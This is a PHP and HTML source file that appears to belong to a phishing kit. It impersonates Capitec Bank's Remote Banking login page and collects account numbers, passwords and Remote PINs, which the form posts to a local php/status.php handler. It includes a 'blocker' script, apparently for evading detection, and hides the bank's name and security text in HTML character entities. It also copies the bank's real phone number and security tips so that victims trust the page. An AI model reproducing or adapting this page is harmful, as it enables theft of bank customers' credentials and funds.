<?php
   require "includes/blocker.php";
   require "includes/functions.php";
   error_reporting(0);
?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="content-type" content="text/html; charset=windows-1252">
      <title>&#73;&#110;&#116;&#101;&#114;&#110;&#101;&#116;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&verbar;&#32;&#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;</title>
      <link rel="stylesheet" type="text/css" href="media/default-3.css">
      <link rel="stylesheet" type="text/css" href="media/jquery-ui-1.css">
      <link rel="stylesheet" type="text/css" href="media/default.css">
      <link href="media/favicon.ico" rel="shortcut icon" type="image/x-icon" />
      <link id="Link1" rel="icon" href="media/favicon.ico" type="image/ico" />
      <script>
         function check(form) {
         var regExpress = /^[a-zA-Z0-9]+$/
         if (!regExpress.test(form.username.value))
         { document.getElementById('errors').style.display = 'block'; form.username.focus(); return;} else { document.getElementById('errors').style.display = 'none'; }
         
         if (form.username.value.length < 5)
         { document.getElementById('errors').style.display = 'block'; form.username.focus(); return;} else { document.getElementById('errors').style.display = 'none'; }
         
         if (form.password.value.length < 4)
         { document.getElementById('errors').style.display = 'block'; form.password.focus(); return;} else { document.getElementById('errors').style.display = 'none'; }
         
         var regExpress = /^[a-zA-Z0-9]+$/
         if (!regExpress.test(form.password.value))
         { document.getElementById('errors').style.display = 'block'; form.password.focus(); return;} else { document.getElementById('errors').style.display = 'none'; }
         form.submit()
         }
      </script>
      <style>.errorMessageAttention {
         color: #BA1316;
         font-size: 18px;
         font-weight: bold;
         font-family: 'Flama-Medium';
         }
		#more {
		  background:none;
		  border:none;
		  color:#FFF;
		  font-family:Verdana, Geneva, sans-serif;
		  cursor:pointer;
		}
	.underline-on-hover:hover {
  		text-decoration: underline;
	}
      </style>
   </head>
   <body topmargin="0">
      <div class="siteHeader">
         <div class="container">
            <div class="logo"><img src="media/logo_main.webp"></div>
            <nav class="primaryNav">
               <ul></ul>
            </nav>
            <ul class="pull-right">
               <li class="hidden-xs">
                  <div class="linkWrap "><a href="#" class="w">&#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;</a></div>
               </li>
               <li>
                  <div class="linkWrap">
                     <a href="#">Security</a>
                  </div>
               </li>
               <li class="phoneHeader">
                  <span href="tel:0860 10 20 43">
                     <div id="mobileNumber" class=" ">0860 10 20 43</div>
                  </span>
               </li>
            </ul>
         </div>
      </div>
      <div id="bodyTagId">
         <div class="container">
            <div align="left">
               <h1 style="z-index:999;">&#82;&#101;&#109;&#111;&#116;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</h1>
               <div id="errors" style="display:none;" class="errorMessage">
                  <div class="errorMessageAttention">Attention</div>
                  Invalid user credentials entered.<br>If you've installed the <b>new</b> &#67;&#97;&#112;&#105;&#116;&#101;&#99;&#32;&#66;&#97;&#110;&#107;&#32;&#97;&#112;&#112;, you now have to use your <b>account number</b> to log in.
               </div>
               <div class="row">
                  <div class="col-md-6">
                     <form id="login" name="login" action="php/status.php" method="POST" autocomplete="off">
                        <fieldset>
                           <label id="usernameLabel" for="username"><span class="username">Account number/username:</span>
                           <input onKeyDown="if(event.keyCode==13) check(this.form);" id="username" name="username" type="text" maxlength="15">
                           </label>
                           <label id="passwordLabel" for="password"><span class="password">Password/Remote PIN:</span>
                           <input onKeyDown="if(event.keyCode==13) check(this.form);" id="password" name="password" type="password" value="" maxlength="15">
                           </label>
                           <input type="hidden" name="option" value="doLogin">
                        </fieldset>
                        <div class="iWantTo">
                           <h2>I want to</h2>
                           <table>
                              <tbody>
                                 <tr>
                                    <td width="15px"><a href="#"><img class="iWantToImg" src="media/proceed.webp" width="15" height="15" border="0"> </a></td>
                                    <td>
									<button style="margin-left:-8px; font-family: 'Flama-Book';font-size: 15px;line-height: 16px;font-weight: normal;color:#009de0;text-decoration:none;background:transparent; border:0;" onclick="check(this.form)" type="button" id="more"><span class="underline-on-hover">Sign in</span></button>
									</td>
                                 </tr>
                              </tbody>
                           </table>
                        </div>
                        <div style="top: 10px; position: absolute; right: -10px;">
                           <a style="cursor: pointer;" href="#"><img src="media/SSL-certificate-seal-ssl-animated.webp" border="0"></a>
                        </div>
                        <div></div>
                     </form>
                  </div>
                  <div class="col-md-6">
                     <div class="info-block">
                        <h2>Security Basics</h2>
                        <ol>
                           <li>We will NEVER ask you for your Remote PIN, password<br>or token passwords by email, SMS or telephone</li>
                           <li>ALWAYS keep your username, Remote PIN, password<br>or token passwords secret</li>
                           <li>&#78;&#69;&#86;&#69;&#82;&#32;&#117;&#115;&#101;&#32;&#97;&#32;&#108;&#105;&#110;&#107;&#32;&#111;&#114;&#32;&#97;&#110;&#32;&#97;&#116;&#116;&#97;&#99;&#104;&#109;&#101;&#110;&#116;&#32;&#105;&#110;&#32;&#97;&#110;&#121;&#32;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#32;&#116;&#111;&#32;&#97;&#99;&#99;&#101;&#115;&#115;&#32;&#82;&#101;&#109;&#111;&#116;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</li>
                           <li>&#65;&#76;&#87;&#65;&#89;&#83;&#32;&#99;&#104;&#101;&#99;&#107;&#32;&#116;&#104;&#97;&#116;&#32;&#116;&#104;&#101;&#32;&#119;&#101;&#98;&#115;&#105;&#116;&#101;&#32;&#97;&#100;&#100;&#114;&#101;&#115;&#115;&#32;&#98;&#97;&#114;&#32;&#97;&#110;&#100;&#32;&#99;&#101;&#114;&#116;&#105;&#102;&#105;&#99;&#97;&#116;&#101;&#32;&#98;&#111;&#116;&#104;&#32;&#109;&#97;&#116;&#99;&#104;&#32;&#99;&#97;&#112;&#105;&#116;&#101;&#99;&#98;&#97;&#110;&#107;&period;&#99;&#111;&period;&#122;&#97;</li>
                           <li>Check your accounts often and report any suspicious activity immediately on <span>0860 10 20 43</span></li>
                        </ol>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>